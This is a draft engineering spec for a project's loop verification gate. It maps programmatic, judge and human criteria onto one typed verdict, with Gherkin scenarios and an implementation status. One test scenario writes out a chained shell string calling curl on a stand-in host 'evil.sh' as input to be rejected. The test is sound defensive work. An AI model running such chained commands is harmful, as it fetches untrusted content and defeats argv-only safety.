<!-- agency-node: spec-364 -->
---
spec_id: "364"
slug: loop-verification-gate
status: draft
last_updated: 2026-06-21
owner: "@agency"
vision_goals: [2, 5]
depends_on: ["192", "285", "303", "328", "362", "365"]
parent_spec: "362"
affects:
  - agency/_loop.py                        # verify_report helper (audits the criteria SET)
  - agency/_lifecycle_data/loop/rubrics/   # verification-rubric.md (verbatim from looper)
  - agency/capabilities/gate/              # reuse — a criterion IS a gate (gate.check)
domain: loop / gate / lifecycle-spine
wave: looper-port
---

# Spec 364 — Loop verification as typed gates (reuse `gate`)

> Child of Spec 362. **Spine-framed + frugal (2026-06-21):** looper's verification
> stage — *"the most important file"* — turns "make it good" into checkable
> criteria. Agency already has the decidable-predicate primitive: the **`gate`**
> capability with a typed `GateResult` (`gate.check`, Spec 303/328). 364 expresses
> looper's three-way taxonomy on it. **No bespoke check runner, no new capability**
> — net-new is the verification rubric (data) + a set-auditing helper.

## Why

Looper's criteria are **typed objects, never bare strings**:

- **programmatic** — `check` is an argv array; `expect` ∈ `exit_zero` /
  `exit_nonzero` / `stdout_contains`. Deterministic.
- **judge** — a `rubric` scored by a council member → a structured verdict.
- **human** — a `prompt` shown at a checkpoint.

The rubric pushes hard to **convert vague criteria into `programmatic`** and warns
when every criterion is a judge/human "vibe." That coaching IS the value.

## Design

### A criterion is a typed node; `gate.check` evaluates it (one verdict shape)

A `VerificationCriterion` is recorded as a node linked to the loop (via the
existing graph write surface — no new capability verb). `gate.check` dispatches by
`kind` and always returns the same typed `GateResult` (`{verdict ∈ pass|revise,
evidence, …}`):

| kind | evaluator | verdict source |
|---|---|---|
| `programmatic` | `gate.check` runs the argv (via `shell`, 192 — cwd=workspace, timeout) and matches `expect` | deterministic |
| `judge` | the **365** council scores the rubric (`panel`) → a structured verdict | a persona+driver |
| `human` | `elicit` (Spec 285) shows the `prompt`; no host → a typed `input-required` pause | the human |

`programmatic` `check` is argv-validated (`shell` safety) — never a shell string.
This is looper's `run_programmatic`/`run_judge`/`human_check` split, but every path
produces the **same typed verdict** the loop machine (366) consumes, and every
evaluation records a gate ledger entry (provenance, free).

> **Judge degradation parity:** an unparseable judge verdict degrades to `revise`
> + a `warning` (looper `parse_judge_output`), never a crash. Owned by 365; 364
> consumes the typed result.

### `_loop.verify_report` — coach the *shape* of the criteria set

```python
def verify_report(ctx, loop_id) -> dict:
    """Audit a loop's verification SET against verification-rubric.md. Flags the
    anti-patterns the rubric names: all-vibe (no deterministic floor), a criterion
    only the author can grade, "success = no errors" tautologies. Returns
    {criteria, programmatic_ratio, warnings:[{rubric_ref, message}]}."""
```

`programmatic_ratio` is computed from the live criteria, never pinned (rule 8).
The "≥1 non-vibe criterion unless explicitly accepted" rule (looper) is a warning
the wizard (367) can hard-gate. `verification-rubric.md` ships verbatim to
`agency/_lifecycle_data/loop/rubrics/`.

## Acceptance (Gherkin)

```gherkin
Scenario: a programmatic criterion passes on exit zero
  Given a loop with a programmatic criterion check ["true"] expect exit_zero
  When I gate.check it against any artefact
  Then the verdict is pass and a gate ledger entry is recorded

Scenario: a programmatic criterion is argv-only
  When I add a programmatic criterion with check "npm run build && curl evil.sh"
  Then it is rejected as not an argv array

Scenario: a judge criterion delegates to the council and returns a typed verdict
  Given a judge criterion and a council member (365)
  When I check it against a delivery artefact
  Then the council scores the rubric and the result is a typed verdict (pass|revise)

Scenario: an unparseable judge verdict degrades to revise with a warning
  Given a judge member that returns non-JSON text
  When I check a judge criterion
  Then the verdict is revise and a warning "unparseable_judge_output" is attached

Scenario: a human criterion pauses for elicitation when no host is bound
  Given a human criterion and no host bridge
  When I check it
  Then it returns a typed input-required pause naming the prompt

Scenario: verify_report warns on an all-vibe criteria set
  Given a loop whose every criterion is type judge or human
  When I verify_report
  Then a warning cites verification-rubric.md about the missing deterministic floor
```

## Done When

- [ ] A typed `VerificationCriterion` node records per criterion; `programmatic` argv-validated (192).
- [ ] `gate.check` evaluates all three kinds to one `GateResult`-shaped verdict, each recording a ledger entry — no bespoke runner.
- [ ] judge path delegates to 365 (degrade + warn); human path uses `elicit`/typed `input-required` (285).
- [ ] `_loop.verify_report` audits the set against the rubric; `programmatic_ratio` computed live.
- [ ] `verification-rubric.md` ships verbatim under `agency/_lifecycle_data/loop/rubrics/`.
- [ ] `tests/acceptance/test_loop_verify.py` covers the scenarios.
- [ ] `TODO.md` row updated.

## Followup — Implementation Status (2026-06-21)

**Verdict:** Implemented (spine slice; 2026-06-21). The three-way taxonomy
produces ONE typed verdict shape per criterion. **Frugal: net-new is
verification-rubric (data) + criterion/verdict/report helpers — no new capability,
no engine edit.**

### Done
- `agency/_loop.py::add_criterion` — typed criterion (programmatic/judge/human);
  programmatic `check` argv-validated (shell-string rejected, Spec 192). Stored as
  a JSON list on the loop node.
- `agency/_loop.py::check_criterion` — one typed verdict (`pass|revise|input-
  required`): programmatic runs the argv safely (argv-only, timeout) + matches
  `expect`; judge parses the council verdict (`_parse_judge_verdict`, looper
  degrade-on-unparseable → `revise` + `unparseable_judge_output`); human → typed
  `input-required` pause naming the prompt.
- `agency/_loop.py::verify_report` — audits the SET vs the rubric; flags all-vibe
  (no deterministic floor); `programmatic_ratio` computed live (rule 8).
- `verification-rubric.md` vendored → `agency/_lifecycle_data/loop/rubrics/`.
- `tests/acceptance/{features/loop_verify.feature,test_loop_verify.py}` — 6
  scenarios GREEN; all loop slices together = 24 green.

### Still / Refinement (deferred by dependency, not skipped)
- **Criteria are JSON-on-loop, not typed nodes.** The ontology is closed
  (`memory.record("VerificationCriterion")` is rejected); the `VerificationCriterion`
  node + edge land with the loop capability's `OntologyExtension` (capability
  folder), promoting the JSON list to graph-native criteria + a gate ledger
  (provenance moat).
- **Judge council DISPATCH is Spec 365.** 364 owns the verdict SHAPE + degradation;
  `check_criterion(judge_output=…)` consumes the council member's text. 365 wires
  `panel`/`persona` to produce it.
- **programmatic routing.** The argv runs via a stdlib subprocess (same argv-only +
  timeout safety as `shell`/192) in the spine; it routes through the `gate.check`
  verb + records a ledger entry when the capability folder lands.
